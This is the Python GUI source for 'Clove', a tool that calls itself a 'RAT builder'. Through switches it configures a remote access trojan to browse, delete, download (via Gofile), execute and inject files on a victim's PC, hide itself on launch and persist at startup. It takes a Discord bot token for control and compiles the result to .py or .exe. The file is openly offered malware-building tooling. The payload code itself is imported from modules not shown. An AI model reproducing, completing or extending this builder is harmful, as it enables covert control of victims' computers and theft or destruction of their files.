import customtkinter
import threading
from tkinter import messagebox
from gui.commands.settingCommands import settingCommands
from gui.compiler.compile import Compile

# ── Appearance ────────────────────────────────────────────────────────────────
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("blue")

# ── Design tokens ─────────────────────────────────────────────────────────────
BG_MAIN   = "#0d0f14"
BG_SIDEBAR= "#13161d"
BG_PANEL  = "#181c25"
BG_CARD   = "#1e2230"
ACCENT    = "#4f8ef7"
ACCENT_DIM= "#2a3f6f"
TEXT_PRI  = "#e8eaf0"
TEXT_SEC  = "#7a8099"
TEXT_DIM  = "#4a5070"
DANGER    = "#e05c6a"
SUCCESS   = "#3ecf8e"
BORDER    = "#252a38"

FONT_HEAD  = ("Georgia", 22, "bold")
FONT_LABEL = ("Courier New", 11)
FONT_SMALL = ("Courier New", 10)
FONT_MONO  = ("Courier New", 12)
FONT_BADGE = ("Georgia", 9, "bold")

SWITCH_KWARGS = dict(
    font=FONT_LABEL,
    fg_color=ACCENT_DIM,
    progress_color=ACCENT,
    button_color=TEXT_PRI,
    button_hover_color="#ffffff",
    text_color=TEXT_PRI,
    text_color_disabled=TEXT_DIM,
)

ENTRY_KWARGS = dict(
    font=FONT_MONO,
    fg_color=BG_MAIN,
    border_color=BORDER,
    border_width=1,
    text_color=TEXT_PRI,
    placeholder_text_color=TEXT_DIM,
    corner_radius=6,
    height=38,
)


class SidebarButton(customtkinter.CTkButton):
    #Navigation pill for the sidebar.

    def __init__(self, master, text, tag, on_select, **kwargs):
        super().__init__(
            master,
            text=text,
            font=FONT_LABEL,
            fg_color="transparent",
            text_color=TEXT_SEC,
            hover_color=BG_CARD,
            anchor="w",
            corner_radius=8,
            height=40,
            command=lambda: on_select(tag),
            **kwargs,
        )
        self._tag = tag

    def set_active(self, active: bool):
        if active:
            self.configure(fg_color=BG_CARD, text_color=TEXT_PRI)
        else:
            self.configure(fg_color="transparent", text_color=TEXT_SEC)


class SectionCard(customtkinter.CTkFrame):

    def __init__(self, master, **kwargs):
        super().__init__(
            master,
            fg_color=BG_CARD,
            corner_radius=10,
            border_width=1,
            border_color=BORDER,
            **kwargs,
        )


class Gui(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.settingCommands = settingCommands()
        self._active_tab = "settings"

        # ── Window ────────────────────────────────────────────────────────────
        self.title("Clove")
        self.geometry("820x540")
        self.resizable(False, False)
        self.configure(fg_color=BG_MAIN)

        # ── Root grid: sidebar | content ──────────────────────────────────────
        self.grid_columnconfigure(0, weight=0, minsize=190)
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self._build_sidebar()
        self._build_panels()
        self._show_tab("settings")


    def _build_sidebar(self):
        self.sidebar = customtkinter.CTkFrame(
            self, fg_color=BG_SIDEBAR, corner_radius=0, width=190
        )
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_propagate(False)

        # Logo / wordmark
        logo_frame = customtkinter.CTkFrame(self.sidebar, fg_color="transparent")
        logo_frame.pack(pady=(28, 4), padx=20, anchor="w")

        customtkinter.CTkLabel(
            logo_frame, text="◈", font=("Georgia", 22), text_color=ACCENT
        ).pack(side="left", padx=(0, 8))
        customtkinter.CTkLabel(
            logo_frame, text="Clove", font=("Georgia", 20, "bold"), text_color=TEXT_PRI
        ).pack(side="left")

        customtkinter.CTkLabel(
            self.sidebar, text="RAT builder  v1.0",
            font=FONT_BADGE, text_color=TEXT_DIM
        ).pack(padx=20, anchor="w", pady=(0, 22))

        # Divider
        customtkinter.CTkFrame(self.sidebar, height=1, fg_color=BORDER).pack(
            fill="x", padx=16, pady=(0, 18)
        )

        # Nav buttons
        nav_items = [
            ("⚙  Settings", "settings"),
            ("⚒  Build",    "build"),
            ("📖  Guide",   "guide"),
        ]
        self._nav_buttons: dict[str, SidebarButton] = {}
        for label, tag in nav_items:
            btn = SidebarButton(self.sidebar, label, tag, self._show_tab)
            btn.pack(fill="x", padx=12, pady=3)
            self._nav_buttons[tag] = btn

        # Bottom version label
        customtkinter.CTkLabel(
            self.sidebar, text="© Clove 2025",
            font=FONT_SMALL, text_color=TEXT_DIM
        ).pack(side="bottom", pady=18)


    def _build_panels(self):
        self.panel_host = customtkinter.CTkFrame(
            self, fg_color=BG_PANEL, corner_radius=0
        )
        self.panel_host.grid(row=0, column=1, sticky="nsew")
        self.panel_host.grid_rowconfigure(0, weight=1)
        self.panel_host.grid_columnconfigure(0, weight=1)

        self.panels: dict[str, customtkinter.CTkFrame] = {}
        self.panels["settings"] = self._make_settings_panel()
        self.panels["build"]    = self._make_build_panel()
        self.panels["guide"]    = self._make_guide_panel()

        for p in self.panels.values():
            p.grid(row=0, column=0, sticky="nsew")

    # ── Tab switcher ──────────────────────────────────────────────────────────
    def _show_tab(self, tag: str):
        self._active_tab = tag
        for t, btn in self._nav_buttons.items():
            btn.set_active(t == tag)
        for t, panel in self.panels.items():
            if t == tag:
                panel.tkraise()


    def _make_settings_panel(self) -> customtkinter.CTkFrame:
        panel = customtkinter.CTkFrame(self.panel_host, fg_color="transparent")

        self._panel_header(panel, "Settings", "Configure module access permissions.")

        # Two-column card grid
        grid = customtkinter.CTkFrame(panel, fg_color="transparent")
        grid.pack(fill="both", expand=True, padx=24, pady=(0, 24))
        grid.grid_columnconfigure((0, 1), weight=1)

        switch_defs = [
            ("Browse",   "Views user files (must be enabled)",   self.settingCommands.browseSwitch.setState,   True),
            ("Delete",   "Permanently deletes target file",       self.settingCommands.deleteSwitch.setState,   True),
            ("Download", "Downloads file via Gofile",             self.settingCommands.downloadSwitch.setState, True),
            ("Execute",  "Remotely executes a file",              self.settingCommands.executeSwitch.setState,  True),
            ("Inject",   "Downloads file onto user's PC",         self.settingCommands.injectSwitch.setState,   True),
            ("Rename",   "Renames a target file",                 self.settingCommands.renameSwitch.setState,   True),
            ("Hide",     "Auto-hides Clove on launch",            self.settingCommands.hideSwitch.setState,     False),
            ("Startup",  "Persists across user sessions",         self.settingCommands.startupSwitch.setState,  False),
        ]

        switch_refs = {}
        for idx, (name, desc, cmd, default) in enumerate(switch_defs):
            row, col = divmod(idx, 2)
            card = SectionCard(grid)
            card.grid(row=row, column=col, padx=6, pady=6, sticky="nsew")

            inner = customtkinter.CTkFrame(card, fg_color="transparent")
            inner.pack(fill="both", expand=True, padx=14, pady=12)

            sw = customtkinter.CTkSwitch(inner, text=name, command=cmd, **SWITCH_KWARGS)
            sw.pack(anchor="w")
            customtkinter.CTkLabel(
                inner, text=desc, font=FONT_SMALL, text_color=TEXT_DIM,
                wraplength=220, justify="left"
            ).pack(anchor="w", padx=2, pady=(3, 0))

            if default:
                sw.select()
            switch_refs[name] = sw

        # Expose the ones needed by on_compile (already stored in settingCommands)
        self.Browse   = switch_refs["Browse"]
        self.Delete   = switch_refs["Delete"]
        self.Download = switch_refs["Download"]
        self.Execute  = switch_refs["Execute"]
        self.Inject   = switch_refs["Inject"]
        self.Rename   = switch_refs["Rename"]
        self.Hide     = switch_refs["Hide"]
        self.onStartUp= switch_refs["Startup"]

        return panel


    def _make_build_panel(self) -> customtkinter.CTkFrame:
        panel = customtkinter.CTkFrame(self.panel_host, fg_color="transparent")

        self._panel_header(panel, "Build", "Configure credentials and compile the payload.")

        scroll = customtkinter.CTkScrollableFrame(
            panel, fg_color="transparent", scrollbar_button_color=BORDER,
        )
        scroll.pack(fill="both", expand=True, padx=24, pady=(0, 24))
        scroll.grid_columnconfigure(0, weight=1)

        # ── Credentials card ──────────────────────────────────────────────────
        cred_card = SectionCard(scroll)
        cred_card.pack(fill="x", pady=(0, 12))

        self._card_header(cred_card, "Credentials")

        self._labeled_entry(cred_card, "Discord Bot Token", "Paste your bot token…", "dbToken")
        self._labeled_entry(cred_card, "Gofile API Key", "Paste your Gofile key…", "apiKey")

        customtkinter.CTkFrame(cred_card, height=1, fg_color=BORDER).pack(
            fill="x", padx=14, pady=(4, 14)
        )

        # ── Compile settings card ─────────────────────────────────────────────
        comp_card = SectionCard(scroll)
        comp_card.pack(fill="x", pady=(0, 12))

        self._card_header(comp_card, "Compile Settings")

        self._labeled_entry(comp_card, "Output filename", "e.g. clove_payload", "filename")

        # Output format row
        fmt_row = customtkinter.CTkFrame(comp_card, fg_color="transparent")
        fmt_row.pack(fill="x", padx=14, pady=(8, 4))
        customtkinter.CTkLabel(
            fmt_row, text="Output format", font=FONT_LABEL, text_color=TEXT_SEC
        ).pack(anchor="w", pady=(0, 4))

        self.compileTo = customtkinter.CTkOptionMenu(
            fmt_row,
            dynamic_resizing=False,
            values=["Python File .py", "Executable .exe"],
            font=FONT_MONO,
            fg_color=BG_MAIN,
            button_color=ACCENT_DIM,
            button_hover_color=ACCENT,
            dropdown_fg_color=BG_CARD,
            dropdown_hover_color=ACCENT_DIM,
            text_color=TEXT_PRI,
            corner_radius=6,
            height=38,
        )
        self.compileTo.pack(fill="x")

        customtkinter.CTkFrame(comp_card, height=1, fg_color=BORDER).pack(
            fill="x", padx=14, pady=(12, 14)
        )

        # ── Compile button ────────────────────────────────────────────────────
        self.build = customtkinter.CTkButton(
            scroll,
            text="  ⚒  Compile",
            font=("Georgia", 13, "bold"),
            fg_color=ACCENT,
            hover_color="#3a70d4",
            text_color="#ffffff",
            corner_radius=8,
            height=44,
            command=self.on_compile,
        )
        self.build.pack(fill="x", pady=(4, 0))

        return panel


    def _make_guide_panel(self) -> customtkinter.CTkFrame:
        panel = customtkinter.CTkFrame(self.panel_host, fg_color="transparent")
        self._panel_header(panel, "Guide", "Quick-start documentation.")

        card = SectionCard(panel)
        card.pack(fill="both", expand=True, padx=24, pady=(0, 24))

        customtkinter.CTkLabel(
            card,
            text="Figure it out yo self twin",
            font=("Georgia", 14),
            text_color=TEXT_DIM,
        ).pack(expand=True)

        return panel


    def _panel_header(self, parent, title: str, subtitle: str):
        hdr = customtkinter.CTkFrame(parent, fg_color="transparent")
        hdr.pack(fill="x", padx=24, pady=(28, 18))

        customtkinter.CTkLabel(hdr, text=title, font=FONT_HEAD, text_color=TEXT_PRI).pack(anchor="w")
        customtkinter.CTkLabel(hdr, text=subtitle, font=FONT_SMALL, text_color=TEXT_DIM).pack(anchor="w", pady=(2, 0))

        customtkinter.CTkFrame(parent, height=1, fg_color=BORDER).pack(fill="x", padx=24, pady=(0, 18))

    def _card_header(self, card, text: str):
        customtkinter.CTkLabel(
            card, text=text.upper(),
            font=FONT_BADGE, text_color=ACCENT
        ).pack(anchor="w", padx=14, pady=(14, 8))

    def _labeled_entry(self, parent, label: str, placeholder: str, attr: str):
        row = customtkinter.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=14, pady=(4, 4))

        customtkinter.CTkLabel(row, text=label, font=FONT_LABEL, text_color=TEXT_SEC).pack(
            anchor="w", pady=(0, 4)
        )
        entry = customtkinter.CTkEntry(row, placeholder_text=placeholder, **ENTRY_KWARGS)
        entry.pack(fill="x")
        setattr(self, attr, entry)


    def on_compile(self):
        token      = self.dbToken.get().strip()
        api_key    = self.apiKey.get().strip()
        hide_flag  = self.settingCommands.hideSwitch.getstate()
        startup_flag = self.settingCommands.startupSwitch.getstate()
        filename   = self.filename.get().strip() or "compiled"
        compile_choice = self.compileTo.get()
        file_type  = "py" if "py" in compile_choice.lower() else "exe"
        print(file_type)

        if not token:
            if not messagebox.askyesno("Missing Token", "Discord Bot Token is empty. Continue anyway?"):
                return

        self.build.configure(state="disabled", text="  ⏳  Compiling…")

        def _run_compile():
            try:
                compiler = Compile(token, api_key, hide_flag, startup_flag, filename, file_type)
                compiler.Compiler()
                messagebox.showinfo("Compile Complete", "Build finished.\nFiles are in the 'build' folder.")
            except Exception as e:
                messagebox.showerror("Compile Error", str(e))
            finally:
                self.build.configure(state="normal", text="  ⚒  Compile")

        threading.Thread(target=_run_compile, daemon=True).start()